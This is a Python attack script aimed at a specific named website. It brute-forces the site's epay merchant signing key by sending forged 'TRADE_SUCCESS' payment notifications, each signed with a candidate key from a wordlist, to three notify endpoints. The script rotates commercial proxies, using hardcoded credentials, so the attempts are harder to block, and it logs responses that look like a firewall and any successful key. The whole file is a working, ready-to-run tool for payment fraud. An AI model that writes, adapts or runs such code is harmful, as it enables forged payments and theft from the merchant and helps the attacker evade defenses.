#!/usr/bin/env python3
"""qq1.lol epay brute — QG proxy direct from HK (no jump SSH)"""
import hashlib
import json
import os
import subprocess
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

BASE = "https://qq1.lol"
OUT = Path(os.environ.get("QQ1_OUT", "/data/automation/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "epay_direct.log"
HITS = OUT / "epay_hits.jsonl"
PROGRESS = OUT / "epay_direct_progress.json"
QG_KEY = os.environ.get("QG_AUTHKEY", "C413ED6D")
QG_PWD = os.environ.get("QG_AUTHPWD", "344F550A6F8B")
WORKERS = int(os.environ.get("EPAY_WORKERS", "8"))
DELAY = float(os.environ.get("EPAY_DELAY", "0.15"))
TRADE_NO = os.environ.get("QQ1_TRADE_NO", "20260720145603146")
PRIORITY = OUT / "epay_priority_keys.txt"
BIG = Path(os.environ.get("EPAY_DICT", "/data/wordlists/epay-keys.txt"))

PARAMS = {
    "pid": "1", "trade_no": TRADE_NO, "out_trade_no": TRADE_NO,
    "type": "alipay", "name": "test", "money": "99.00", "trade_status": "TRADE_SUCCESS",
}
ENDPOINTS = ["other/epay_notify.php", "other/alipay_notify.php", "other/qqpay_notify.php"]
lock = threading.Lock()
found = threading.Event()
done = 0
start_ts = time.time()
_proxy_pool = []
_proxy_lock = threading.Lock()


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    with lock:
        print(line, flush=True)
        with open(LOG, "a") as f:
            f.write(line + "\n")


def fetch_proxies(n=8):
    out = []
    try:
        r = subprocess.run(
            ["curl", "-s", f"https://share.proxy.qg.net/get?key={QG_KEY}&num={n}"],
            capture_output=True, text=True, timeout=15,
        )
        data = json.loads(r.stdout)
        if data.get("code") == "SUCCESS":
            for x in data["data"]:
                out.append(f"http://{QG_KEY}:{QG_PWD}@{x['server']}")
    except Exception:
        pass
    return out or [None]


def epay_sign(params, key):
    items = sorted((k, v) for k, v in params.items() if k not in ("sign", "sign_type") and v != "")
    return hashlib.md5(("&".join(f"{k}={v}" for k, v in items) + key).encode()).hexdigest()


def post_notify(proxy, post, ep):
    cmd = ["curl", "-sk", "--max-time", "12", "-X", "POST",
           "-H", "Content-Type: application/x-www-form-urlencoded",
           "-H", f"Referer: {BASE}/", "-d", post, f"{BASE}/{ep}"]
    if proxy:
        cmd[2:2] = ["-x", proxy]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        return (r.stdout or "").strip()
    except Exception as e:
        return f"err:{e}"


def try_key(key, line_no, proxy):
    if found.is_set():
        return
    data = dict(PARAMS)
    data["sign"] = epay_sign(PARAMS, key)
    data["sign_type"] = "MD5"
    post = "&".join(f"{k}={v}" for k, v in data.items())
    for ep in ENDPOINTS:
        resp = post_notify(proxy, post, ep)
        if not resp:
            continue
        if "_guard" in resp:
            return "waf"
        low = resp.lower()
        if "success" in low or resp in ("OK", "ok"):
            hit = {"key": key, "ep": ep, "resp": resp, "line": line_no}
            log(f"*** HIT {hit}")
            with open(HITS, "a") as f:
                f.write(json.dumps(hit) + "\n")
            found.set()
            return "hit"
        if resp and resp not in ("error", "fail") and "签名" not in resp:
            log(f"  unusual key={key!r} ep={ep}: {resp[:80]}")
    global done
    with lock:
        done += 1
        if done % 50 == 0:
            rate = done / max(1, time.time() - start_ts)
            log(f"  progress done={done} rate={rate:.1f}/s")
    time.sleep(DELAY)


def run_file(path, offset=0):
    keys = []
    with open(path) as f:
        for i, line in enumerate(f):
            if i < offset:
                continue
            k = line.strip()
            if k:
                keys.append((k, i))
    log(f"run {path} keys={len(keys)} offset={offset}")
    proxies = fetch_proxies(WORKERS)
    batch = 40
    for i in range(0, len(keys), batch):
        if found.is_set():
            return
        chunk = keys[i:i + batch]
        with ThreadPoolExecutor(max_workers=WORKERS) as ex:
            futs = [ex.submit(try_key, k, ln, proxies[j % len(proxies)]) for j, (k, ln) in enumerate(chunk)]
            for f in as_completed(futs):
                f.result()
        PROGRESS.write_text(json.dumps({"file": str(path), "line": chunk[-1][1] if chunk else offset}))
        if i % (batch * 5) == 0:
            proxies = fetch_proxies(WORKERS)


def main():
    log(f"=== epay DIRECT workers={WORKERS} ===")
    # quick test connectivity
    r = post_notify(None, "trade_no=test&sign=test&sign_type=MD5", "other/epay_notify.php")
    log(f"connectivity: {r[:80] if r else 'empty'}")
    if PRIORITY.exists():
        run_file(PRIORITY)
    if not found.is_set() and BIG.exists():
        off = 0
        if PROGRESS.exists():
            try:
                p = json.loads(PROGRESS.read_text())
                if p.get("file") == str(BIG):
                    off = p.get("line", 0)
            except Exception:
                pass
        run_file(BIG, off)
    log(f"=== done total={done} ===")


if __name__ == "__main__":
    main()
